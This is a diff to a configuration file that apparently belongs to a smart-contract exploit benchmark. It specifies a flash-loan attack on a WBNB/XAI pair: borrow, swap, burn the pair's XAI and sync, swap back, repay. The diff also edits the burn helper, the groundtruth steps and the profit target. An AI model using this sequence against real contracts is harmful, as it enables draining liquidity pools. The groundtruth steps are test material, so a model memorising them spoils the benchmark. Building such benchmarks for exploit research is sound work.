@@ -17,7 +17,7 @@ ctrt_name2deploy:
   
 extra_actions:
  - "function burn_xai_pair(uint256 amount) internal eurus {
-      xai.burn(amount);
+      xai.burn(xai.totalSupply() - amount);
       pair.sync();
     }"
 
@@ -26,12 +26,12 @@ extra_deployments: []
 
 extra_statements: []
 
-attack_goal_str: "wbnb; 1e12"
+attack_goal_str: "wbnb; 1e3"
 
 groundtruth:
   - ["borrow", "wbnb", "owner", "3000 * 1e18"]
   - ["swap", "pair", "attacker", "wbnb", "xai", "wbnb.balanceOf(attacker)", "pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))"]
-  - ["burn", "xai", "pair", "xai.totalSupply() - 10000 "]
+  - ["burn", "xai", "pair", "10000"]
   - ["swap", "pair", "attacker", "xai", "wbnb", "xai.balanceOf(attacker)", "pair.getAmountOut(xai.balanceOf(attacker), address(xai))"]
   - ["payback", "wbnb", "owner", "3000 * 1e18"]
 
